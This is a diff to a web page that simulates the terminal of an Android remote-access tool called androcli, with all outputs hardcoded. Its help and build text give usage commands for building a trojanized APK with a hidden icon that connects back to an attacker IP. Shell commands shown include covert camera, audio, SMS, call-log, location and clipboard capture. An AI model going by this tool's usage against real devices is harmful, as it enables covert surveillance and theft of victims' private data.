@@ -21,9 +21,10 @@
         .container {
             width: 100%;
             display: flex;
-            flex-direction: column;
+            flex-direction: row;
             align-items: center;
             justify-content: center;
+            gap: 40px;
         }
 
         .terminal-container {
@@ -217,6 +218,173 @@
         .terminal-logo img:hover {
             transform: scale(1.05);
         }
+
+        .mode-indicator {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .mode-normal {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .mode-build {
+            background-color: #2196F3;
+            color: white;
+        }
+
+        .mode-shell {
+            background-color: #FF9800;
+            color: white;
+        }
+
+        .command-line.build-mode .prompt {
+            color: #2196F3;
+        }
+
+        .command-line.shell-mode .prompt {
+            color: #FF9800;
+        }
+
+        .phone-mockup {
+            width: 300px;
+            height: 600px;
+            background: #1a1a1a;
+            border-radius: 40px;
+            border: 10px solid #333;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .phone-screen {
+            width: 100%;
+            height: 100%;
+            background: #000;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .phone-status-bar {
+            height: 30px;
+            background: #000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 0 20px;
+            color: white;
+            font-size: 12px;
+        }
+
+        .phone-content {
+            height: calc(100% - 30px);
+            padding: 20px;
+            color: white;
+            font-family: 'SF Mono', 'Consolas', monospace;
+            font-size: 12px;
+            overflow-y: auto;
+        }
+
+        .signal-animation {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: rgba(0, 255, 0, 0.1);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.5; }
+            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.2; }
+            100% { transform: translate(-50%, -50%) scale(0.8); opacity: 0.5; }
+        }
+
+        .app-icon {
+            width: 50px;
+            height: 50px;
+            background: #4CAF50;
+            border-radius: 10px;
+            margin: 10px;
+            display: inline-block;
+            animation: install 2s forwards;
+        }
+
+        @keyframes install {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .loading-dots {
+            display: inline-block;
+            animation: loading 1.5s infinite;
+        }
+
+        @keyframes loading {
+            0%, 100% { content: '.'; }
+            33% { content: '..'; }
+            66% { content: '...'; }
+        }
+
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .popup-content {
+            background: #1e1e1e;
+            padding: 20px;
+            border-radius: 8px;
+            border: 2px solid #4CAF50;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            animation: popup 0.3s ease-out;
+        }
+
+        .popup-content h3 {
+            color: #4CAF50;
+            margin-bottom: 15px;
+        }
+
+        .popup-content p {
+            color: #e0e0e0;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .popup-content button {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        @keyframes popup {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
     </style>
 </head>
 <body>
@@ -246,6 +414,7 @@
                     <div class="control maximize"></div>
                 </div>
                 <h2 class="terminal-title">andro-cli@terminal ~</h2>
+                <div class="mode-indicator mode-normal" id="modeIndicator">NORMAL</div>
             </div>
             <div class="terminal-body" id="terminalBody">
                 <div class="output">
@@ -279,6 +448,17 @@
                 </div>
             </div>
         </div>
+        <div class="phone-mockup">
+            <div class="phone-screen">
+                <div class="phone-status-bar">
+                    <span>9:41</span>
+                    <span>📶 100%</span>
+                </div>
+                <div class="phone-content" id="phoneContent">
+                    <!-- Content will be dynamically updated -->
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -290,14 +470,25 @@
         setInterval(updateTime, 1000);
         updateTime();
 
+        let currentMode = 'normal';
+        const modeIndicator = document.getElementById('modeIndicator');
+        const commandLine = document.querySelector('.command-line');
+
+        function setMode(mode) {
+            currentMode = mode;
+            commandLine.className = `command-line ${mode}-mode`;
+            modeIndicator.className = `mode-indicator mode-${mode}`;
+            modeIndicator.textContent = mode.toUpperCase();
+        }
+
         const commands = {
             help: () => {
                 return `
 Available Commands:
 ------------------
 help                - Show this help message
-build               - Build the Android APK
-shell               - Start interactive shell
+build               - Enter build mode
+shell               - Enter shell mode
 deviceInfo          - Get device information
 camList             - List available cameras
 takepic [cameraID]  - Take picture from camera
@@ -307,7 +498,6 @@ startAudio          - Start audio recording
 stopAudio           - Stop audio recording
 getSMS [inbox|sent] - Get SMS logs
 getCallLogs         - Get call logs
-shell               - Start device shell
 vibrate [times]     - Vibrate device
 getLocation         - Get device location
 getIP               - Get device IP
@@ -320,22 +510,16 @@ exit                - Exit terminal
 Type 'help [command]' for more information about a specific command.`;
             },
             build: () => {
-                return `
-Build Options:
--------------
---build             - Build the Android APK
---ngrok            - Use ngrok tunnel
---shell            - Get interactive shell
-
-Flags:
--p, --port         - Attacker port number (default: 8000)
--o, --output       - APK filename (default: test.apk)
--icon, --icon      - Show/hide app icon (default: hidden)
--i, --ip           - Attacker IP address (required)
-
-Examples:
-python3 androcli.py --build --ngrok -o try.apk
-python3 androcli.py --build -i 192.168.x.x -p 8000 -o try.apk`;
+                setMode('build');
+                return `[+] Entered build mode
+[+] Type 'help' to see build commands
+[+] Type 'exit' to return to normal mode`;
+            },
+            shell: () => {
+                setMode('shell');
+                return `[+] Entered shell mode
+[+] Type 'help' to see shell commands
+[+] Type 'exit' to return to normal mode`;
             },
             deviceInfo: () => {
                 return `
@@ -432,6 +616,10 @@ Clipboard content: "Hello, World!"`;
                 return '';
             },
             exit: () => {
+                if (currentMode !== 'normal') {
+                    setMode('normal');
+                    return `[+] Exited ${currentMode} mode`;
+                }
                 return 'Goodbye!';
             }
         };
@@ -452,14 +640,577 @@ Clipboard content: "Hello, World!"`;
             const cmd = parts[0].toLowerCase();
             const args = parts.slice(1);
 
-            if (commands[cmd]) {
-                const result = commands[cmd](args);
-                if (result) {
-                    addOutput(result);
+            // Common commands that work in all modes
+            if (cmd === 'clear') {
+                document.getElementById('commandHistory').innerHTML = '';
+                return '';
+            }
+            if (cmd === 'exit') {
+                if (currentMode !== 'normal') {
+                    setMode('normal');
+                    return `[+] Exited ${currentMode} mode`;
+                }
+                return 'Goodbye!';
+            }
+            if (cmd === 'help') {
+                if (currentMode === 'build') {
+                    return `
+Build Mode Commands:
+------------------
+--build             - Build the Android APK
+--ngrok            - Use ngrok tunnel
+--shell            - Get interactive shell
+
+Flags:
+-p, --port         - Attacker port number (default: 8000)
+-o, --output       - APK filename (default: test.apk)
+-icon, --icon      - Show/hide app icon (default: hidden)
+-i, --ip           - Attacker IP address (required)
+
+Examples:
+python3 androcli.py --build --ngrok -o try.apk
+python3 androcli.py --build -i 192.168.x.x -p 8000 -o try.apk`;
+                } else if (currentMode === 'shell') {
+                    return `
+Shell Mode Commands:
+------------------
+deviceInfo          - Get device information
+camList             - List available cameras
+takepic [cameraID]  - Take picture from camera
+startVideo [cameraID] - Start video recording
+stopVideo           - Stop video recording
+startAudio          - Start audio recording
+stopAudio           - Stop audio recording
+getSMS [inbox|sent] - Get SMS logs
+getCallLogs         - Get call logs
+vibrate [times]     - Vibrate device
+getLocation         - Get device location
+getIP               - Get device IP
+getSimDetails       - Get SIM card details
+getClipData         - Get clipboard data
+getMACAddress       - Get MAC address
+ls                  - List directory contents
+cd [directory]      - Change directory
+pwd                 - Print working directory
+cat [file]          - Display file contents
+whoami              - Show current user
+ps                  - List running processes
+netstat             - Show network connections
+ifconfig            - Show network interfaces
+clear               - Clear terminal
+exit                - Return to normal mode`;
+                } else {
+                    return `
+Available Commands:
+------------------
+help                - Show this help message
+build               - Enter build mode
+shell               - Enter shell mode
+exit                - Exit terminal
+
+Type 'help [command]' for more information about a specific command.`;
+                }
+            }
+
+            // Mode-specific commands
+            if (currentMode === 'build') {
+                // Check if it's a Python command
+                if (cmd === 'python3' || cmd === 'python') {
+                    const subCmd = args[0];
+                    if (subCmd === 'androcli.py' && args[1] === '--build') {
+                        // Extract IP and port from args
+                        const ipIndex = args.indexOf('-i') !== -1 ? args.indexOf('-i') : args.indexOf('--ip');
+                        const portIndex = args.indexOf('-p') !== -1 ? args.indexOf('-p') : args.indexOf('--port');
+                        const outputIndex = args.indexOf('-o') !== -1 ? args.indexOf('-o') : args.indexOf('--output');
+                        
+                        const ip = ipIndex !== -1 ? args[ipIndex + 1] : '0.0.0.0';
+                        const port = portIndex !== -1 ? args[portIndex + 1] : '8000';
+                        const output = outputIndex !== -1 ? args[outputIndex + 1] : 'test.apk';
+
+                        return `[+] Starting APK build process...
+[+] Command: python3 androcli.py --build -i ${ip} -p ${port} -o ${output}
+[+] Checking dependencies...
+    ✓ Python 3.9.0
+    ✓ Java JDK 11
+    ✓ Android SDK
+    ✓ APKTool
+[+] Initializing build environment...
+    ✓ Creating temporary workspace
+    ✓ Setting up build tools
+[+] Processing source files...
+    ✓ Decompiling base APK
+    ✓ Injecting payload
+    ✓ Modifying AndroidManifest.xml
+[+] Building new APK...
+    ✓ Compiling resources
+    ✓ Packaging application
+    ✓ Signing APK
+[+] Finalizing build...
+    ✓ Optimizing APK size
+    ✓ Verifying integrity
+[+] Build completed successfully!
+[+] Output: /output/${output}
+[+] Size: 2.5 MB
+[+] SHA256: a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6
+[+] Payload configured:
+    - IP: ${ip}
+    - Port: ${port}
+    - Output: ${output}
+
+[!] IMPORTANT: After installing this APK on your Android device:
+    1. The app will appear as a normal application
+    2. When launched, it will connect to ${ip}:${port}
+    3. You will get an interactive shell terminal
+    4. Use shell commands to control the device
+
+[+] Build completed! APK is ready for installation.`;
+                    }
+                }
+                switch (cmd) {
+                    case '--ngrok':
+                        return `[+] Setting up ngrok tunnel...
+[+] Tunnel established at: https://abc123.ngrok.io`;
+                    case '--shell':
+                        setMode('shell');
+                        return `[+] Entered shell mode
+[+] Type 'help' to see shell commands`;
+                    default:
+                        return `[!] Unknown build command: ${cmd}
+[+] Type 'help' to see available build commands`;
+                }
+            } else if (currentMode === 'shell') {
+                // Convert command to lowercase for case-insensitive matching
+                const normalizedCmd = cmd.toLowerCase();
+                switch (normalizedCmd) {
+                    case 'deviceinfo':
+                    case 'device-info':
+                        return `[+] Getting device information...
+
+Device Information:
+-----------------
+📱 Device Details:
+  Manufacturer: Samsung
+  Model: Galaxy S21 Ultra 5G
+  Device: SM-G998B
+  Android Version: 13.0
+  API Level: 33
+  Build Number: TP1A.220624.014
+  Security Patch: 2023-12-01
+
+🔋 Battery Status:
+  Level: 85%
+  Health: Good
+  Temperature: 32.5°C
+  Voltage: 4.2V
+  Technology: Li-ion
+
+💾 Storage Information:
+  Total Internal: 256GB
+  Available: 128.5GB
+  Total RAM: 12GB
+  Available RAM: 4.2GB
+
+📶 Network Status:
+  WiFi: Connected
+  Mobile Data: Enabled
+  Bluetooth: On
+  NFC: Enabled
+
+🔒 Security:
+  Screen Lock: Pattern
+  Encryption: Enabled
+  SELinux: Enforcing
+  Root Status: Not Rooted
+
+🔄 System Uptime: 2 days, 5 hours, 32 minutes`;
+                    case 'camlist':
+                    case 'cam-list':
+                        return `[+] Enumerating available cameras...
+
+Available Cameras:
+----------------
+📸 Camera ID: 0 (Back Main)
+  Resolution: 108MP (12000x9000)
+  Aperture: f/1.8
+  Focal Length: 26mm
+  Features: OIS, PDAF, Laser AF
+
+📸 Camera ID: 1 (Back Ultra Wide)
+  Resolution: 12MP (4000x3000)
+  Aperture: f/2.2
+  Focal Length: 13mm
+  Features: 120° FOV
+
+📸 Camera ID: 2 (Back Telephoto)
+  Resolution: 10MP (3648x2736)
+  Aperture: f/2.4
+  Focal Length: 70mm
+  Features: 3x Optical Zoom
+
+📸 Camera ID: 3 (Front)
+  Resolution: 40MP (7296x5472)
+  Aperture: f/2.2
+  Features: Auto Focus, HDR`;
+                    case 'takepic':
+                    case 'take-pic':
+                        return `[+] Taking picture from camera ${args[0] || '0'}...
+[+] Camera initialized...
+[+] Focusing...
+[+] Capturing image...
+[+] Processing image...
+[+] Saving image...
+
+[+] Picture captured successfully!
+[+] Saved to: /sdcard/DCIM/Camera/IMG_20240315_123456.jpg
+[+] Resolution: 12000x9000
+[+] Size: 12.5MB
+[+] Format: JPEG
+[+] EXIF Data:
+    - Camera: Samsung Galaxy S21 Ultra
+    - Focal Length: 26mm
+    - ISO: 100
+    - Shutter Speed: 1/1000
+    - Aperture: f/1.8`;
+                    case 'startvideo':
+                    case 'start-video':
+                        return `[+] Starting video recording from camera ${args[0] || '0'}...
+[+] Camera initialized...
+[+] Video settings:
+    Resolution: 3840x2160 (4K)
+    Frame Rate: 60fps
+    Bitrate: 50Mbps
+    Codec: H.265
+    Audio: AAC 256kbps
+
+[+] Recording started at: 2024-03-15 12:34:56
+[+] Recording in progress...`;
+                    case 'stopvideo':
+                    case 'stop-video':
+                        return `[+] Stopping video recording...
+[+] Finalizing video...
+[+] Processing audio...
+[+] Saving file...
+
+[+] Video saved successfully!
+[+] File: /sdcard/DCIM/Camera/VID_20240315_123456.mp4
+[+] Duration: 00:02:45
+[+] Size: 1.2GB
+[+] Resolution: 3840x2160
+[+] Frame Rate: 60fps`;
+                    case 'startaudio':
+                    case 'start-audio':
+                        return `[+] Starting audio recording...
+[+] Audio settings:
+    Format: AAC
+    Sample Rate: 48kHz
+    Channels: 2 (Stereo)
+    Bitrate: 256kbps
+    Source: Microphone
+
+[+] Recording started at: 2024-03-15 12:34:56
+[+] Recording in progress...`;
+                    case 'stopaudio':
+                    case 'stop-audio':
+                        return `[+] Stopping audio recording...
+[+] Processing audio...
+[+] Saving file...
+
+[+] Audio saved successfully!
+[+] File: /sdcard/Music/recording_20240315_123456.mp3
+[+] Duration: 00:05:30
+[+] Size: 10.1MB
+[+] Format: MP3
+[+] Bitrate: 256kbps`;
+                    case 'getsms':
+                    case 'get-sms':
+                        return `[+] Retrieving SMS logs...
+[+] Processing messages...
+
+SMS Logs (Last 10 messages):
+--------------------------
+📱 Inbox:
+1. From: Mom (+919876540000)
+   Time: 2024-03-15 10:30:15
+   Message: "Call me when you get home"
+
+2. From: Bank (+919876540000)
+   Time: 2024-03-15 10:25:30
+   Message: "OTP for transaction: 123456"
+
+3. From: Amazon (+919800043212)
+   Time: 2024-03-15 09:45:22
+   Message: "Your order #12345 has been shipped"
+
+📤 Sent:
+1. To: GF💕 (+919000000000)
+   Time: 2024-03-15 11:20:45
+   Message: "love you so much"
+
+2. To: ansh (+919876543214)
+   Time: 2024-03-15 09:30:10
+   Message: "vivek collage ajaa "
+
+[+] Logs saved to: /sdcard/Download/sms_logs.txt`;
+                    case 'getcalllogs':
+                    case 'get-call-logs':
+                        return `[+] Retrieving call logs...
+[+] Processing call history...
+
+Call Logs (Last 10 calls):
+------------------------
+📞 Incoming:
+1. From: Mom (+919876543210)
+   Time: 2024-03-15 11:30:15
+   Duration: 00:05:45
+   Type: Voice
+
+2. From: ansh (+919876543214)
+   Time: 2024-03-15 10:45:30
+   Duration: 00:02:30
+   Type: Video
+
+📞 Outgoing:
+1. To: GF💕 (+919876540000)
+   Time: 2024-03-15 09:20:15
+   Duration: 00:03:15
+   Type: Voice
+
+2. To: Support (+919876543215)
+   Time: 2024-03-15 08:30:45
+   Duration: 00:10:20
+   Type: Voice
+
+[+] Logs saved to: /sdcard/Download/call_logs.txt`;
+                    case 'getlocation':
+                    case 'get-location':
+                        return `[+] Getting device location...
+[+] Acquiring GPS signal...
+[+] Processing location data...
+
+Location Information:
+-------------------
+📍 Coordinates:
+  Latitude: 12.9716° N
+  Longitude: 77.5946° E
+  Altitude: 920m
+
+🎯 Accuracy:
+  Horizontal: 10m
+  Vertical: 15m
+  Speed: 0.0 m/s
+
+📡 Provider: GPS
+⏰ Time: 2024-03-15 12:34:56 UTC
+
+🗺️ Address:
+  Street: 123 Main Street
+  City: Bangalore
+  State: Karnataka
+  Country: India
+  Postal Code: 560001`;
+                    case 'getip':
+                    case 'get-ip':
+                        return `[+] Getting network information...
+
+Network Details:
+--------------
+🌐 WiFi:
+  IP Address: 192.168.1.100
+  MAC Address: 00:11:22:33:44:55
+  SSID: MyHomeWiFi
+  Signal Strength: -65 dBm
+  Channel: 6
+  Security: WPA2-PSK
+
+📱 Mobile Data:
+  IP Address: 10.20.30.40
+  IMSI: 123456789012345
+  Network: JIO 4G
+  Signal Strength: -75 dBm
+  Data State: Connected
+
+🔌 VPN: Not Connected`;
+                    case 'getsimdetails':
+                    case 'get-sim-details':
+                        return `[+] Getting SIM card information...
+
+SIM Card Details:
+---------------
+📱 SIM 1:
+  IMSI: 123456789012345
+  Phone Number: +919876543210
+  Network: JIO
+  Signal Strength: -75 dBm
+  Network Type: LTE
+  MCC: 404
+  MNC: 36
+  Country: India
+  Operator: Reliance Jio
+  Roaming: No
+
+📱 SIM 2:
+  IMSI: 987654321098765
+  Phone Number: +919876543211
+  Network: Airtel
+  Signal Strength: -80 dBm
+  Network Type: LTE
+  MCC: 404
+  MNC: 10
+  Country: India
+  Operator: Bharti Airtel
+  Roaming: No`;
+                    case 'getmacaddress':
+                    case 'get-mac-address':
+                        return `[+] Getting MAC addresses...
+
+Network Interfaces:
+-----------------
+📶 WiFi:
+  MAC Address: 00:11:22:33:44:55
+  Interface: wlan0
+  Type: IEEE 802.11
+
+📱 Bluetooth:
+  MAC Address: 00:11:22:33:44:56
+  Interface: bt-pan
+  Type: Bluetooth
+
+📡 Ethernet:
+  MAC Address: 00:11:22:33:44:57
+  Interface: eth0
+  Type: IEEE 802.3`;
+                    case 'getclipdata':
+                    case 'get-clip-data':
+                        return `[+] Getting clipboard data...
+
+Clipboard History:
+----------------
+1. Text: "Hello, World!"
+   Time: 2024-03-15 12:30:15
+   Type: Text
+
+2. Text: "https://github.com/example"
+   Time: 2024-03-15 12:25:30
+   Type: URL
+
+3. Text: "Password123!"
+   Time: 2024-03-15 12:20:45
+   Type: Text
+
+Current Clipboard:
+----------------
+Type: Text
+Content: "Hello, World!"
+Time: 2024-03-15 12:30:15`;
+                    case 'vibrate':
+                        return `[+] Vibrating device ${args[0] || '1'} times...
+[+] Vibration pattern: Short (100ms)
+[+] Intensity: Medium
+[+] Starting vibration sequence...
+
+[+] Vibration complete`;
+                    case 'ls':
+                        return `[+] Listing directory contents...
+
+Directory: /
+----------
+drwxr-xr-x root     root              2024-03-15 12:00 bin
+drwxr-xr-x root     root              2024-03-15 12:00 dev
+drwxr-xr-x root     root              2024-03-15 12:00 etc
+drwxr-xr-x root     root              2024-03-15 12:00 proc
+drwxrwx--x system   sdcard_rw         2024-03-15 12:00 sdcard
+drwxr-xr-x root     root              2024-03-15 12:00 system
+drwxrwx--x root     root              2024-03-15 12:00 tmp
+drwxr-xr-x root     root              2024-03-15 12:00 usr`;
+                    case 'cd':
+                        return `[+] Changing directory to ${args[0] || '/'}...
+[+] Current directory: ${args[0] || '/'}`;
+                    case 'pwd':
+                        return `[+] Current working directory:
+/`;
+                    case 'cat':
+                        return `[+] Displaying contents of ${args[0] || 'file'}:
+
+This is a sample file content.
+Line 1: Hello, World!
+Line 2: This is a test file.
+Line 3: Created on 2024-03-15
+Line 4: Last modified: 2024-03-15 12:34:56
+Line 5: File size: 1024 bytes`;
+                    case 'whoami':
+                        return `[+] Current user information:
+Username: root
+UID: 0
+GID: 0
+Groups: root, system, shell`;
+                    case 'ps':
+                        return `[+] Listing running processes...
+
+  PID USER     TIME  COMMAND
+    1 root      0:00 init
+    2 root      0:00 [kthreadd]
+    3 root      0:00 [ksoftirqd/0]
+    4 root      0:00 [kworker/0:0]
+    5 root      0:00 [kworker/0:0H]
+    6 root      0:00 [mm_percpu_wq]
+    7 root      0:00 [ksoftirqd/1]
+    8 root      0:00 [kworker/1:0]
+    9 root      0:00 [kworker/1:0H]
+   10 root      0:00 [ksoftirqd/2]`;
+                    case 'netstat':
+                        return `[+] Active network connections...
+
+Active Internet connections
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 192.168.1.100:8000      0.0.0.0:*               LISTEN
+tcp        0      0 192.168.1.100:443       0.0.0.0:*               LISTEN
+tcp        0      0 192.168.1.100:22        0.0.0.0:*               LISTEN
+tcp        0      0 192.168.1.100:9090      0.0.0.0:*               LISTEN
+
+Active UNIX domain sockets
+Proto RefCnt Flags       Type       State         Path
+unix  2      [ ACC ]     STREAM     LISTENING     /dev/socket/logd
+unix  2      [ ACC ]     STREAM     LISTENING     /dev/socket/rild`;
+                    case 'ifconfig':
+                        return `[+] Network interface configuration...
+
+wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
+        inet6 fe80::211:22ff:fe33:4455  prefixlen 64  scopeid 0x20<link>
+        ether 00:11:22:33:44:55  txqueuelen 1000  (Ethernet)
+        RX packets 123456  bytes 98765432 (94.1 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 98765  bytes 12345678 (11.7 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+rmnet0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.20.30.40  netmask 255.255.255.0  broadcast 10.20.30.255
+        inet6 fe80::211:22ff:fe33:4456  prefixlen 64  scopeid 0x20<link>
+        ether 00:11:22:33:44:56  txqueuelen 1000  (Ethernet)
+        RX packets 54321  bytes 8765432 (8.3 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12345  bytes 2345678 (2.2 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0`;
+                    default:
+                        return `[!] Unknown shell command: ${cmd}
+[+] Type 'help' to see available shell commands`;
                 }
             } else {
-                addOutput(`Command not found: ${cmd}`, 'error');
-                addOutput('Type "help" to see available commands', 'info');
+                // Normal mode commands
+                if (cmd === 'build') {
+                    setMode('build');
+                    return `[+] Entered build mode
+[+] Type 'help' to see build commands
+[+] Type 'exit' to return to normal mode`;
+                } else if (cmd === 'shell') {
+                    setMode('shell');
+                    return `[+] Entered shell mode
+[+] Type 'help' to see shell commands
+[+] Type 'exit' to return to normal mode`;
+                } else {
+                    return `Command not found: ${cmd}
+Type "help" to see available commands`;
+                }
             }
         }
 
@@ -467,7 +1218,10 @@ Clipboard content: "Hello, World!"`;
             if (e.key === 'Enter') {
                 const command = commandInput.value;
                 addOutput(`andro-cli@terminal:~$ ${command}`);
-                processCommand(command);
+                const result = processCommand(command);
+                if (result) {
+                    addOutput(result);
+                }
                 commandInput.value = '';
                 terminalBody.scrollTop = terminalBody.scrollHeight;
             }
@@ -475,6 +1229,144 @@ Clipboard content: "Hello, World!"`;
 
         // Initial help message
         // addOutput(commands.help());
+
+        function updatePhoneContent(command, args) {
+            const phoneContent = document.getElementById('phoneContent');
+            phoneContent.innerHTML = '';
+
+            // Only show shell commands in phone mockup
+            if (currentMode === 'shell') {
+                switch(command) {
+                    case 'ls':
+                        showSignalAnimation(() => {
+                            phoneContent.innerHTML = `
+                                <div style="color: #4CAF50;">[+] Listing directory contents...</div>
+                                <div style="margin-top: 20px;">
+                                    <div>📁 bin</div>
+                                    <div>📁 dev</div>
+                                    <div>📁 etc</div>
+                                    <div>📁 proc</div>
+                                    <div>📁 sdcard</div>
+                                    <div>📁 system</div>
+                                    <div>📁 tmp</div>
+                                    <div>📁 usr</div>
+                                </div>
+                            `;
+                        });
+                        break;
+                    case 'pwd':
+                        showSignalAnimation(() => {
+                            phoneContent.innerHTML = `
+                                <div style="color: #4CAF50;">[+] Current directory:</div>
+                                <div style="margin-top: 20px;">
+                                    <div>📁 /</div>
+                                </div>
+                            `;
+                        });
+                        break;
+                    case 'whoami':
+                        showSignalAnimation(() => {
+                            phoneContent.innerHTML = `
+                                <div style="color: #4CAF50;">[+] Current user:</div>
+                                <div style="margin-top: 20px;">
+                                    <div>👤 root</div>
+                                </div>
+                            `;
+                        });
+                        break;
+                    case 'ps':
+                        showSignalAnimation(() => {
+                            phoneContent.innerHTML = `
+                                <div style="color: #4CAF50;">[+] Running processes:</div>
+                                <div style="margin-top: 20px;">
+                                    <div>🔄 init (PID: 1)</div>
+                                    <div>🔄 kthreadd (PID: 2)</div>
+                                    <div>🔄 ksoftirqd/0 (PID: 3)</div>
+                                </div>
+                            `;
+                        });
+                        break;
+                    case 'netstat':
+                        showSignalAnimation(() => {
+                            phoneContent.innerHTML = `
+                                <div style="color: #4CAF50;">[+] Network connections:</div>
+                                <div style="margin-top: 20px;">
+                                    <div>🌐 192.168.1.100:8000</div>
+                                    <div>📡 LISTEN</div>
+                                </div>
+                            `;
+                        });
+                        break;
+                    case 'ifconfig':
+                        showSignalAnimation(() => {
+                            phoneContent.innerHTML = `
+                                <div style="color: #4CAF50;">[+] Network interfaces:</div>
+                                <div style="margin-top: 20px;">
+                                    <div>📶 wlan0</div>
+                                    <div>📡 192.168.1.100</div>
+                                    <div>🔒 00:11:22:33:44:55</div>
+                                </div>
+                            `;
+                        });
+                        break;
+                    default:
+                        phoneContent.innerHTML = `
+                            <div style="color: #888; text-align: center; margin-top: 50%;">
+                                Waiting for command...
+                            </div>
+                        `;
+                }
+            } else {
+                phoneContent.innerHTML = `
+                    <div style="color: #888; text-align: center; margin-top: 50%;">
+                        Waiting for command...
+                    </div>
+                `;
+            }
+        }
+
+        function showSignalAnimation(callback) {
+            const phoneContent = document.getElementById('phoneContent');
+            const signal = document.createElement('div');
+            signal.className = 'signal-animation';
+            phoneContent.innerHTML = '';
+            phoneContent.appendChild(signal);
+            
+            setTimeout(() => {
+                signal.remove();
+                callback();
+            }, 1500);
+        }
+
+        // Modify the processCommand function to update phone content
+        const originalProcessCommand = processCommand;
+        processCommand = function(command) {
+            const parts = command.trim().split(' ');
+            const cmd = parts[0].toLowerCase();
+            const args = parts.slice(1);
+            
+            updatePhoneContent(cmd, args);
+            return originalProcessCommand(command);
+        };
+
+        function showBuildCompletePopup(ip, port) {
+            const popup = document.createElement('div');
+            popup.className = 'popup-overlay';
+            popup.innerHTML = `
+                <div class="popup-content">
+                    <h3>🎉 Build Completed Successfully!</h3>
+                    <p>Your APK has been built successfully. After installing this APK on your Android device:</p>
+                    <ul style="text-align: left; color: #e0e0e0; margin-bottom: 20px;">
+                        <li>The app will appear as a normal application</li>
+                        <li>When launched, it will connect to ${ip}:${port}</li>
+                        <li>You will get an interactive shell terminal</li>
+                        <li>Use shell commands to control the device</li>
+                    </ul>
+                    <button onclick="this.parentElement.parentElement.remove()">Got it!</button>
+                </div>
+            `;
+            document.body.appendChild(popup);
+        }
     </script>
 </body>
-</html> 
+</html>
